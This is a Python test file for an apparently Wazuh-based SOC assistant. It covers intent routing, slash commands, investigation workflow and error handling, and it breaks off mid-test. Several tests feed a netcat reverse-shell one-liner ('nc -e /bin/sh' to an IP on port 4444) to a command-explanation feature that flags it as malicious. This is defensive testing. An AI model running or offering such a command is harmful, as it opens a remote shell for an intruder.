import json
from datetime import UTC, datetime

import pytest
from opensearchpy import exceptions as opensearch_exc

from app.services.wazuh.exceptions import WazuhTimeoutError
from app.services.wazuh.models import (
    AlertEvidence,
    AlertIngestionDocument,
    AlertSearchResult,
    ArchivedLogSearchResult,
    IOCHuntResult,
    RawAlertDocument,
)
from app.soc_assistant.command_explainer import CommandExplanation
from app.soc_assistant.router import AssistantIntentRouter
from app.soc_assistant.schemas import AssistantCommandName, AssistantIntent
from app.soc_assistant.schemas import QuestionAnswer
from app.soc_assistant.service import SOCAssistant
from app.soc_assistant.tool_agent import SOCToolAgentAnswer, build_tools
from app.db.repositories.alert_memory import InMemoryAlertMemoryRepository
from app.db.repositories.reports import InMemoryReportRepository


class FailingLLM:
    def invoke_structured(self, schema, messages):
        raise RuntimeError("provider unavailable")


class RoutedLLM:
    def invoke_structured(self, schema, messages):
        return (
            AssistantIntent(
                command=AssistantCommandName.SUMMARY,
                confidence=0.9,
            ),
            {"input_tokens": 10, "output_tokens": 4},
        )


class LowConfidenceLLM:
    def invoke_structured(self, schema, messages):
        return (
            AssistantIntent(
                command=AssistantCommandName.HELP,
                confidence=0.2,
            ),
            {"input_tokens": 5, "output_tokens": 2},
        )


class ArgumentAliasLLM:
    def __init__(self, command, arguments):
        self.command = command
        self.arguments = arguments

    def invoke_structured(self, schema, messages):
        return (
            AssistantIntent(
                command=self.command,
                arguments=self.arguments,
                confidence=1.0,
            ),
            {"input_tokens": 8, "output_tokens": 3},
        )


class UnavailableToolAgent:
    def answer(self, **kwargs):
        raise RuntimeError("tool agent offline in tests")


class FakeQuestionAgent:
    def __init__(self):
        self.calls = []

    def answer(self, **kwargs):
        self.calls.append(kwargs)
        return (
            QuestionAnswer(
                answer="Block the source only after validating it is not an approved scanner.",
                confidence=0.86,
                limitations=["No firewall state was provided."],
            ),
            {"input_tokens": 40, "output_tokens": 18},
        )


class FakeGateway:
    def __init__(self):
        self.calls = []

    def search_alerts(self, **kwargs):
        self.calls.append(("search_alerts", kwargs))
        return AlertSearchResult(
            total=1,
            returned=1,
            truncated=False,
            alerts=[
                AlertEvidence(
                    alert_id="alert-1",
                    timestamp=datetime(2026, 7, 24, tzinfo=UTC),
                    agent_id="001",
                    agent_name="servervb",
                    rule_id="5712",
                    rule_level=10,
                    description="sshd brute force",
                    source_ip="192.0.2.10",
                    rule_groups=["sshd"],
                    mitre_ids=["T1110"],
                    event_outcome="failure",
                )
            ],
        )

    def alert_summary(self, *, hours):
        self.calls.append(("alert_summary", {"hours": hours}))
        return {"total_alerts": 7, "by_level": {"10": 2}}

    def hunt_ioc_telemetry(self, **kwargs):
        self.calls.append(("hunt_ioc_telemetry", kwargs))
        return IOCHuntResult(
            indicator=kwargs["indicator"],
            indicator_type=kwargs["indicator_type"],
            alerts=AlertSearchResult(
                total=1,
                returned=1,
                truncated=False,
                alerts=[],
            ),
            archived_logs=ArchivedLogSearchResult(
                index_pattern="wazuh-archives-*",
                archive_status="available",
                total=2,
                returned=2,
                truncated=False,
                events=[],
            ),
        )

    def indexer_health(self):
        self.calls.append(("indexer_health", {}))
        return {"status": "green"}

    def validate_server(self):
        self.calls.append(("validate_server", {}))
        return {"data": {}}

    def get_raw_alert_by_id(self, alert_id):
        self.calls.append(("get_raw_alert_by_id", {"alert_id": alert_id}))
        if alert_id != "alert-1":
            return None
        normalized = self.search_alerts().alerts[0]
        return RawAlertDocument(
            alert_id=alert_id,
            normalized=normalized,
            raw_document=normalized.model_dump(mode="json"),
        )


class UnreachableWazuhGateway(FakeGateway):
    def search_alerts(self, **kwargs):
        self.calls.append(("search_alerts", kwargs))
        raise opensearch_exc.ConnectionError("connection refused")


class FakeInvestigations:
    def __init__(self):
        self.started = []

    def start(self, **kwargs):
        self.started.append(kwargs)
        return {
            "investigation_id": "INV-TEST",
            "alert_id": kwargs["alert_id"],
            "agent_id": kwargs["agent_id"],
            "status": "awaiting_approval",
            "current_stage": "human_approval",
            "diagnosis": {"classification": "malicious"},
            "pending_nodes": ["execute"],
        }

    def snapshot(self, investigation_id, *, organization_id):
        if investigation_id == "INV-MISSING":
            from app.orchestration.investigation_service import (
                InvestigationNotFoundError,
            )

            raise InvestigationNotFoundError(investigation_id)
        return {
            "investigation_id": investigation_id,
            "alert_id": "alert-1",
            "agent_id": "001",
            "status": "completed",
            "current_stage": "report",
            "pending_nodes": [],
        }

    def active_for_alert(self, alert_id, *, organization_id):
        return None


def test_slash_commands_are_strict_and_typed():
    router = AssistantIntentRouter(llm=FailingLLM())

    alerts = router.parse_slash(
        "/alerts ssh --hours 6 --min-level 10 --limit 5 --agent 001"
    )
    assert alerts.command == AssistantCommandName.ALERTS
    assert alerts.arguments == {
        "text": "ssh",
        "hours": 6,
        "min_level": 10,
        "limit": 5,
        "agent_id": "001",
    }
    assert router.parse_slash("/mapek alert-1").command == (
        AssistantCommandName.INVESTIGATE
    )
    question = router.parse_slash("/ask how should I contain this alert?")
    assert question.command == AssistantCommandName.CHAT
    assert question.arguments["question"] == "how should I contain this alert?"
    explained = router.parse_slash("/explain nc -e /bin/sh 192.0.2.10 4444")
    assert explained.command == AssistantCommandName.EXPLAIN
    assert router.parse_slash("/plan INV-TEST").arguments == {
        "investigation_id": "INV-TEST"
    }
    assert router.parse_slash("/collect INV-TEST").command == (
        AssistantCommandName.COLLECT
    )
    assert router.parse_slash("/continue INV-TEST").command == (
        AssistantCommandName.CONTINUE
    )
    assert explained.arguments["command"] == "nc -e /bin/sh 192.0.2.10 4444"
    with pytest.raises(ValueError, match="Unsupported option"):
        router.parse_slash("/alerts --write yes")
    with pytest.raises(ValueError, match="Unknown command"):
        router.parse_slash("/shell")


def test_recent_investigation_turns_ambiguous_follow_up_into_status():
    intent = SOCAssistant._apply_recent_context(
        AssistantIntent(
            command=AssistantCommandName.CHAT,
            arguments={"question": "what happened now?"},
        ),
        message="what happened now?",
        recent_context={"investigation": "INV-RECENT"},
    )

    assert intent.command == AssistantCommandName.STATUS
    assert intent.arguments == {"investigation_id": "INV-RECENT"}

    collect = SOCAssistant._apply_recent_context(
        AssistantIntent(command=AssistantCommandName.CHAT),
        message="collect more evidence",
        recent_context={"investigation": "INV-RECENT"},
    )
    assert collect.command == AssistantCommandName.COLLECT
    assert collect.arguments == {"investigation_id": "INV-RECENT"}


def test_general_what_happened_question_is_not_forced_to_status():
    intent = SOCAssistant._apply_recent_context(
        AssistantIntent(command=AssistantCommandName.CHAT),
        message="what happened on server 001 yesterday?",
        recent_context={"investigation": "INV-RECENT"},
    )

    assert intent.command == AssistantCommandName.CHAT


@pytest.mark.parametrize(
    ("message", "command"),
    [
        ("hello", AssistantCommandName.CHAT),
        ("get only alerts", AssistantCommandName.ALERTS),
        ("give me the latest alerts", AssistantCommandName.ALERTS),
        ("threat hunt for 192.0.2.10", AssistantCommandName.HUNT),
        (
            "run the whole MAPE-K process for alert alert-1",
            AssistantCommandName.INVESTIGATE,
        ),
        ("investigate it", AssistantCommandName.INVESTIGATE),
        ("how do I fix these alerts?", AssistantCommandName.CHAT),
        ("check status INV-ABC123", AssistantCommandName.STATUS),
    ],
)
def test_common_natural_language_routes_without_llm(message, command):
    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)

    assert intent.command == command
    assert usage == {"input_tokens": 0, "output_tokens": 0}


def test_ambiguous_language_uses_oxy_classifier_and_fails_soft():
    routed, usage = AssistantIntentRouter(llm=RoutedLLM()).route(
        "Give me an operational picture."
    )
    assert routed.command == AssistantCommandName.SUMMARY
    assert routed.source == "oxy"
    assert usage["input_tokens"] == 10

    fallback, usage = AssistantIntentRouter(llm=FailingLLM()).route(
        "Give me an operational picture."
    )
    assert fallback.command == AssistantCommandName.CHAT
    assert fallback.source == "fallback"
    assert fallback.arguments["question"] == "Give me an operational picture."
    assert usage == {"input_tokens": 0, "output_tokens": 0}


def test_low_confidence_classification_routes_to_chat_not_a_dead_end():
    routed, usage = AssistantIntentRouter(llm=LowConfidenceLLM()).route(
        "Give me an operational picture."
    )
    assert routed.command == AssistantCommandName.CHAT
    assert routed.arguments["question"] == "Give me an operational picture."
    assert usage["input_tokens"] == 5


@pytest.mark.parametrize(
    ("message", "expected_alert_id"),
    [
        ("investigate alert 12345", "12345"),
        ("investigate alert ALERT-99", "ALERT-99"),
        ("investigate this", None),
        ("start investigation alert-xyz", "alert-xyz"),
    ],
)
def test_natural_investigation_references_do_not_capture_placeholders(
    message,
    expected_alert_id,
):
    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)

    assert intent.command == AssistantCommandName.INVESTIGATE
    assert intent.arguments.get("alert_id") == expected_alert_id
    assert usage == {"input_tokens": 0, "output_tokens": 0}


@pytest.mark.parametrize(
    ("command", "raw_arguments", "expected_arguments"),
    [
        (
            AssistantCommandName.ALERTS,
            {"agent": "004"},
            {"agent_id": "004"},
        ),
        (
            AssistantCommandName.STATUS,
            {"investigation-id": "INV-ABC123"},
            {"investigation_id": "INV-ABC123"},
        ),
    ],
)
def test_oxy_argument_aliases_are_normalized(
    command,
    raw_arguments,
    expected_arguments,
):
    router = AssistantIntentRouter(
        llm=ArgumentAliasLLM(command, raw_arguments)
    )

    intent, usage = router.route("Give me the scoped operational record.")

    assert intent.command == command
    assert intent.arguments == expected_arguments
    assert intent.source == "oxy"
    assert usage["input_tokens"] == 8


def test_unknown_oxy_arguments_fail_closed_to_chat():
    router = AssistantIntentRouter(
        llm=ArgumentAliasLLM(
            AssistantCommandName.ALERTS,
            {"endpoint_scope": "004"},
        )
    )

    intent, _ = router.route("Give me the scoped operational record.")

    assert intent.command == AssistantCommandName.CHAT
    assert intent.source == "fallback"


@pytest.mark.parametrize(
    ("message", "command", "arguments"),
    [
        (
            "what alerts came in overnight?",
            AssistantCommandName.ALERTS,
            {"hours": 12},
        ),
        (
            "any critical alerts in the last hour?",
            AssistantCommandName.ALERTS,
            {"hours": 1, "severity": "critical"},
        ),
        (
            "show me alerts from agent 004",
            AssistantCommandName.ALERTS,
            {"agent_id": "004"},
        ),
        ("are we connected?", AssistantCommandName.HEALTH, {}),
        (
            "isolate agent 004",
            AssistantCommandName.CHAT,
            {"question": "isolate agent 004"},
        ),
        (
            "explain this command: nc -e /bin/sh 1.2.3.4 4444",
            AssistantCommandName.EXPLAIN,
            {"command": "nc -e /bin/sh 1.2.3.4 4444"},
        ),
    ],
)
def test_high_signal_natural_language_routes_without_oxy(
    message,
    command,
    arguments,
):
    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)

    assert intent.command == command
    assert intent.arguments == arguments
    assert usage == {"input_tokens": 0, "output_tokens": 0}


def test_casual_investigate_phrasing_reaches_chat_deterministically():
    message = (
        "this use missed the password more than one time ; could u "
        "investigate him 192.168.100.9"
    )
    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)

    assert intent.command == AssistantCommandName.CHAT
    assert intent.arguments["question"] == message
    assert usage == {"input_tokens": 0, "output_tokens": 0}


@pytest.mark.parametrize(
    "message",
    [
        "analyze them",
        "check these",
        "check it",
        "look into it",
        "what do you think",
        "investigate",
        "any suspicious",
    ],
)
def test_vague_targetless_messages_short_circuit_to_one_summary_call(message):
    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)

    assert intent.command == AssistantCommandName.SUMMARY
    assert intent.arguments == {"vague_fallback": True}
    assert usage == {"input_tokens": 0, "output_tokens": 0}


def test_vague_shortcut_does_not_swallow_targeted_or_formal_phrasing():
    router = AssistantIntentRouter(llm=FailingLLM())

    assert router.route("investigate it")[0].command == (
        AssistantCommandName.INVESTIGATE
    )
    assert router.route("check status INV-ABC123")[0].command == (
        AssistantCommandName.STATUS
    )
    assert router.route("show recent alerts")[0].command == (
        AssistantCommandName.ALERTS
    )


def assistant() -> tuple[SOCAssistant, FakeGateway, FakeInvestigations]:
    gateway = FakeGateway()
    investigations = FakeInvestigations()
    return (
        SOCAssistant(
            gateway=gateway,
            investigations=investigations,
            router=AssistantIntentRouter(llm=FailingLLM()),
            tool_agent=UnavailableToolAgent(),
        ),
        gateway,
        investigations,
    )


def respond(service: SOCAssistant, message: str):
    return service.respond(
        message=message,
        conversation_id="conversation-test",
        organization_id="user-test",
        user_id="user-test",
    )


def test_alerts_and_hunt_execute_only_bounded_gateway_methods(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, gateway, _ = assistant()

    alerts = respond(service, "/alerts --hours 6 --min-level 10")
    assert alerts.selected_command == AssistantCommandName.ALERTS
    assert alerts.tools_used == ["search_alerts"]
    assert alerts.response["finding_count"] == 1
    assert gateway.calls[0][1]["hours"] == 6

    hunt = respond(service, "/hunt 192.0.2.10 --type ip")
    assert hunt.selected_command == AssistantCommandName.HUNT
    assert hunt.response["indicator"] == "192.0.2.10"
    assert hunt.response["alerts"]["total"] == 1
    assert hunt.response["archived_logs"]["total"] == 2
    assert hunt.tools_used == ["hunt_ioc_telemetry"]


def test_vague_message_gets_one_deterministic_summary_and_a_nudge(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        tool_agent=UnavailableToolAgent(),
    )

    response = respond(service, "analyze them")

    assert response.selected_command == AssistantCommandName.SUMMARY
    assert response.tools_used == ["alert_summary"]
    assert "tell me which alert or asset" in response.assistant_message


def test_greeting_is_conversational_and_does_not_call_tools(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, gateway, _ = assistant()

    response = respond(service, "hello")

    assert response.selected_command == AssistantCommandName.CHAT
    assert response.tools_used == []
    assert response.response["display_mode"] == "conversation"
    assert gateway.calls == []


def test_question_agent_answers_read_only_soc_questions(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    question_agent = FakeQuestionAgent()
    gateway = FakeGateway()
    service = SOCAssistant(
        gateway=gateway,
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=question_agent,
        tool_agent=UnavailableToolAgent(),
    )

    response = respond(service, "how do I fix these alerts?")

    assert response.selected_command == AssistantCommandName.CHAT
    assert response.response["display_mode"] == "conversation"
    assert response.response["answer_type"] == "soc_question"
    assert response.tools_used == ["soc_question_agent"]
    assert "Block the source" in response.assistant_message
    assert question_agent.calls[0]["question"] == "how do I fix these alerts?"
    assert gateway.calls == []


def test_live_tool_failure_never_falls_back_to_ungrounded_answer(monkeypatch):
    class FailingLiveToolAgent:
        def answer(self, **kwargs):
            raise opensearch_exc.ConnectionError("connection refused")

    class SpyQuestionAgent(FakeQuestionAgent):
        def answer(self, **kwargs):
            raise AssertionError(
                "question_agent must not run after a live tool failure"
            )

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=SpyQuestionAgent(),
        tool_agent=FailingLiveToolAgent(),
    )

    response = respond(service, "were there failed SSH logins today?")

    assert response.selected_command == AssistantCommandName.CHAT
    assert response.response["answer_type"] == "live_data_unavailable"
    assert response.response["grounded"] is False
    assert response.response["error"]["code"] == "WAZUH_UNAVAILABLE"
    assert response.tools_used == ["soc_tool_agent"]
    assert response.activities[-1].status == "failed"


def test_live_tool_timeout_is_reported_as_timeout(monkeypatch):
    class TimingOutToolAgent:
        def answer(self, **kwargs):
            raise WazuhTimeoutError("timed out after retries")

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=FakeQuestionAgent(),
        tool_agent=TimingOutToolAgent(),
    )

    response = respond(service, "were there failed SSH logins today?")

    assert response.response["error"]["code"] == "WAZUH_TIMEOUT"
    assert "did not answer" in response.assistant_message


def test_question_agent_failure_does_not_break_commands(monkeypatch):
    class FailingQuestionAgent:
        def answer(self, **kwargs):
            raise RuntimeError("provider unavailable")

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=FailingQuestionAgent(),
        tool_agent=UnavailableToolAgent(),
    )

    response = respond(service, "why is this finding suspicious?")

    assert response.response["answer_type"] == "model_unavailable"
    assert response.response["display_mode"] == "conversation"
    assert response.tools_used == []


def test_chat_rate_limit_skips_question_agent_fallback(monkeypatch):
    class RateLimited(Exception):
        status_code = 429

    class RateLimitedToolAgent:
        def answer(self, **kwargs):
            raise RateLimited("Subscription rate limit exceeded")

    class SpyQuestionAgent:
        def __init__(self):
            self.calls = []

        def answer(self, **kwargs):
            self.calls.append(kwargs)
            raise AssertionError("question_agent must not run after a rate limit")

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    question_agent = SpyQuestionAgent()
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=question_agent,
        tool_agent=RateLimitedToolAgent(),
    )

    response = respond(service, "why is this finding suspicious?")

    assert response.response["answer_type"] == "rate_limited"
    assert response.response["display_mode"] == "conversation"
    assert "rate limit" in response.assistant_message.lower()
    assert question_agent.calls == []


def test_triage_groups_alerts_and_returns_evidence_backed_verdicts(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    from app.db.repositories.findings import InMemoryFindingRepository, get_finding_repository

    get_finding_repository.cache_clear()
    monkeypatch.setattr(
        "app.services.wazuh.triage.service.get_finding_repository",
        lambda: InMemoryFindingRepository(),
    )
    service, gateway, _ = assistant()

    triage = respond(service, "/triage --hours 6 --min-level 10")
    assert triage.selected_command == AssistantCommandName.TRIAGE
    assert triage.tools_used == ["run_triage"]
    assert triage.response["finding_count"] == 1
    assert triage.response["findings"][0]["verdict"] == "malicious"
    assert gateway.calls[-1][1]["hours"] == 6


def test_investigate_and_status_use_durable_workflow_service(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, _, investigations = assistant()

    started = respond(service, "/investigate alert-1 --agent 001")
    assert started.active_investigation_id == "INV-TEST"
    assert started.investigation["current_stage"] == "human_approval"
    assert investigations.started[0]["initiated_by"] == "user-test"

    status = respond(service, "/status INV-TEST")
    assert status.response["status"] == "completed"
    assert status.active_investigation_id == "INV-TEST"


def test_escalated_investigation_reads_as_finished_not_in_progress(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)

    class EscalatedInvestigations(FakeInvestigations):
        def start(self, **kwargs):
            return {
                "investigation_id": "INV-ESCALATED",
                "alert_id": kwargs["alert_id"],
                "agent_id": kwargs["agent_id"],
                "status": "escalated",
                "current_stage": "analyze",
                "diagnosis": {"confidence": 0.86},
                "pending_nodes": [],
            }

        def snapshot(self, investigation_id, *, organization_id):
            return {
                "investigation_id": investigation_id,
                "alert_id": "alert-1",
                "agent_id": "001",
                "status": "escalated",
                "current_stage": "analyze",
                "pending_nodes": [],
            }

    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=EscalatedInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        tool_agent=UnavailableToolAgent(),
    )

    started = respond(service, "/investigate alert-1 --agent 001")
    assert "escalated for analyst review" in started.assistant_message
    assert "Current stage" not in started.assistant_message

    status = respond(service, "/status INV-ESCALATED")
    assert "escalated for analyst review" in status.assistant_message


def test_investigate_rejects_placeholder_before_starting(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, _, investigations = assistant()

    result = respond(service, "/investigate ALERT-ID --agent 001")

    assert result.response["error"] == "INVALID_ALERT_ID"
    assert "placeholder" in result.response["message"]
    assert investigations.started == []


def test_investigate_rejects_agent_mismatch(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, _, investigations = assistant()

    result = respond(service, "/investigate alert-1 --agent 999")

    assert result.response["error"] == "ALERT_AGENT_MISMATCH"
    assert investigations.started == []


def test_investigate_returns_existing_active_investigation(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, _, investigations = assistant()
    investigations.active_for_alert = lambda alert_id, organization_id: {
        "investigation_id": "INV-EXISTING",
        "alert_id": alert_id,
        "agent_id": "001",
        "status": "running",
        "current_stage": "analyze",
    }

    result = respond(service, "/investigate alert-1 --agent 001")

    assert result.response["investigation_id"] == "INV-EXISTING"
    assert result.response["existing"] is True
    assert investigations.started == []


def test_controlled_commands_use_the_existing_investigation(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)

    class ControlledInvestigations(FakeInvestigations):
        def snapshot(self, investigation_id, *, organization_id):
            return {
                "investigation_id": investigation_id,
                "alert_id": "alert-1",
                "agent_id": "001",
                "status": "escalated",
                "current_stage": "analyze",
                "pending_nodes": [],
                "diagnosis": {"needs_more_evidence": True},
                "remediation_plan": None,
                "advisory_plan": None,
            }

        def collect_more_evidence(self, investigation_id, *, organization_id):
            value = self.snapshot(
                investigation_id,
                organization_id=organization_id,
            )
            value.update({"status": "running", "current_stage": "monitor"})
            return value

        def continue_investigation(self, investigation_id, *, organization_id):
            return self.collect_more_evidence(
                investigation_id,
                organization_id=organization_id,
            )

    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=ControlledInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        tool_agent=UnavailableToolAgent(),
    )

    plan = respond(service, "/plan INV-TEST")
    collected = respond(service, "/collect INV-TEST")
    continued = respond(service, "/continue INV-TEST")

    assert plan.response["plan_available"] is False
    assert plan.response["grounded"] is True
    assert collected.active_investigation_id == "INV-TEST"
    assert collected.response["current_stage"] == "monitor"
    assert continued.active_investigation_id == "INV-TEST"


def test_non_durable_alerts_never_claim_a_new_since_cursor(monkeypatch):
    memory = InMemoryAlertMemoryRepository()
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    monkeypatch.setattr(
        "app.soc_assistant.service.get_alert_memory_repository",
        lambda: memory,
    )
    service, _, _ = assistant()

    first = respond(service, "/alerts")
    second = respond(service, "/alerts")
    other_user = service.respond(
        message="/alerts",
        conversation_id="conversation-other",
        organization_id="user-other",
        user_id="user-other",
    )

    assert first.response["new_alerts"] is None
    assert first.response["recent_alerts"] == 1
    assert first.response["since"] is None
    assert first.response["cursor_status"] == "unavailable"
    assert second.response["new_alerts"] is None
    assert second.response["since"] is None
    assert other_user.response["new_alerts"] is None


def test_durable_alerts_query_postgresql_memory_not_live_wazuh(monkeypatch):
    class DurableMemory(InMemoryAlertMemoryRepository):
        durable = True

    memory = DurableMemory()
    observed_at = datetime.now(UTC).replace(microsecond=0)
    memory.remember_alert_document(
        AlertIngestionDocument(
            document_id="alert-persisted",
            index_name="wazuh-alerts-test",
            normalized=AlertEvidence(
                alert_id="alert-persisted",
                timestamp=observed_at,
                agent_id="001",
                agent_name="servervb",
                rule_id="5712",
                rule_level=10,
                description="sshd brute force",
                source_ip="192.0.2.10",
            ),
            raw_document={},
        )
    )

    class FindingRepository:
        def list(self, **kwargs):
            return [
                {
                    "finding_id": "FND-PERSISTED",
                    "status": "open",
                    "version": 1,
                    "event_type": "ssh_brute_force",
                    "created_at": observed_at,
                    "updated_at": observed_at,
                    "finding": {
                        "finding_id": "FND-PERSISTED",
                        "title": "Repeated SSH authentication failures",
                        "summary": "Correlated from persisted Wazuh alerts.",
                        "severity": "high",
                        "first_seen": observed_at.isoformat(),
                        "last_seen": observed_at.isoformat(),
                        "representative_alert_id": "alert-persisted",
                    },
                    "verdict": {
                        "verdict": "malicious",
                        "confidence": 0.9,
                    },
                }
            ]

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    monkeypatch.setattr(
        "app.soc_assistant.service.get_alert_memory_repository",
        lambda: memory,
    )
    monkeypatch.setattr(
        "app.soc_assistant.service.get_finding_repository",
        lambda: FindingRepository(),
    )
    service, gateway, _ = assistant()

    first = respond(service, "/alerts")
    second = respond(service, "/alerts")

    assert first.response["source"] == "postgresql"
    assert first.response["new_alerts"] is None
    assert first.response["new_findings"] is None
    assert first.response["baseline_established"] is True
    assert first.response["recent_alerts"] == 1
    assert first.tools_used == ["query_alert_memory"]
    assert second.response["new_alerts"] == 0
    assert second.response["baseline_established"] is False
    assert second.response["findings"] == []
    assert gateway.calls == []


def test_conversation_reference_resolves_investigate_it(monkeypatch):
    memory = InMemoryAlertMemoryRepository()
    memory.remember_alert_document(
        AlertIngestionDocument(
            document_id="alert-1",
            index_name="wazuh-alerts-test",
            normalized=FakeGateway().search_alerts().alerts[0],
            raw_document={},
        )
    )
    memory.add_conversation_reference(
        conversation_id="conversation-test",
        message_id="message-1",
        organization_id="user-test",
        reference_type="wazuh_alert",
        reference_value="alert-1",
    )
    monkeypatch.setattr(
        "app.soc_assistant.service.database_url",
        lambda: "configured",
    )
    monkeypatch.setattr(
        "app.soc_assistant.service.get_alert_memory_repository",
        lambda: memory,
    )
    monkeypatch.setattr(
        "app.soc_assistant.references.get_alert_memory_repository",
        lambda: memory,
    )
    monkeypatch.setattr(
        SOCAssistant,
        "_persist",
        staticmethod(lambda **kwargs: None),
    )
    service, gateway, investigations = assistant()

    result = respond(service, "investigate it")

    assert result.active_alert_id == "alert-1"
    assert result.active_investigation_id == "INV-TEST"
    assert investigations.started[0]["alert_id"] == "alert-1"
    assert not any(call[0] == "get_raw_alert_by_id" for call in gateway.calls)


def test_help_and_health_are_available_without_llm(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service, _, _ = assistant()

    help_response = respond(service, "/help")
    assert len(help_response.response["commands"]) == 13
    assert help_response.tools_used == []

    health = respond(service, "/health")
    assert health.response["status"] == "healthy"
    assert health.tools_used == ["indexer_health", "validate_server"]


def test_explain_command_is_available_from_chat_and_slash(monkeypatch):
    def fake_explain(command):
        assert command == "nc -e /bin/sh 1.2.3.4 4444"
        return (
            CommandExplanation(
                plain_english="Netcat launches a shell and connects it outward.",
                behavior=["Starts a shell", "Connects to 1.2.3.4:4444"],
                risk="malicious",
                indicators=["-e", "/bin/sh"],
                recommended_checks=["Review process and network telemetry."],
            ),
            {"input_tokens": 20, "output_tokens": 12},
        )

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    monkeypatch.setattr(
        "app.soc_assistant.service.explain_command",
        fake_explain,
    )
    service, _, _ = assistant()

    natural = respond(
        service,
        "explain this command: nc -e /bin/sh 1.2.3.4 4444",
    )
    slash = respond(service, "/explain nc -e /bin/sh 1.2.3.4 4444")

    for response in (natural, slash):
        assert response.selected_command == AssistantCommandName.EXPLAIN
        assert response.response["risk"] == "malicious"
        assert response.response["display_mode"] == "command_explanation"
        assert response.tools_used == ["explain_command"]


def test_wazuh_connection_failure_returns_assistant_message(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    gateway = UnreachableWazuhGateway()
    service = SOCAssistant(
        gateway=gateway,
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        tool_agent=UnavailableToolAgent(),
    )

    result = respond(service, "give me the latest alerts")

    assert result.selected_command == AssistantCommandName.ALERTS
    assert result.tools_used == ["search_alerts"]
    assert result.response["status"] == "unavailable"
    assert result.response["error"]["code"] == "WAZUH_UNAVAILABLE"
    assert "Wazuh is unreachable" in result.assistant_message
    assert result.activities[-1].status == "failed"


def test_tool_agent_answers_with_live_tool_calls(monkeypatch):
    class FakeToolAgent:
        def answer(self, **kwargs):
            return (
                "There were 3 failed SSH logins today.",
                ["search_alerts"],
                None,
            )

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=FakeQuestionAgent(),
        tool_agent=FakeToolAgent(),
    )

    response = respond(service, "any failed SSH logins today?")

    assert response.selected_command == AssistantCommandName.CHAT
    assert response.response["answer_type"] == "soc_tool_agent"
    assert "search_alerts" in response.tools_used
    assert any(
        activity.label == "Queried search_alerts"
        for activity in response.activities
    )
    assert "3 failed SSH logins" in response.assistant_message


def test_tool_agent_failure_is_machine_visible_in_chat_payload(monkeypatch):
    class PartiallyFailingToolAgent:
        def answer(self, **kwargs):
            return SOCToolAgentAnswer(
                answer="The alert search failed, so live scope is unverified.",
                tool_calls=["search_alerts"],
                failed_tools=["search_alerts"],
            )

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=FakeQuestionAgent(),
        tool_agent=PartiallyFailingToolAgent(),
    )

    response = respond(service, "show suspicious activity")

    assert response.response["answer_type"] == "soc_tool_agent_partial"
    assert response.response["grounded"] is False
    assert response.response["failed_tools"] == ["search_alerts"]


def test_chat_answer_that_surfaces_an_alert_updates_active_alert_id(monkeypatch):
    class FakeToolAgentWithAlert:
        def answer(self, **kwargs):
            return (
                "That's a level-10 SSH brute-force alert.",
                ["get_alert"],
                "cVATn58B3vQGyj_JLTuV",
            )

    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    service = SOCAssistant(
        gateway=FakeGateway(),
        investigations=FakeInvestigations(),
        router=AssistantIntentRouter(llm=FailingLLM()),
        question_agent=FakeQuestionAgent(),
        tool_agent=FakeToolAgentWithAlert(),
    )

    response = respond(service, "is there an alert of level 10?")

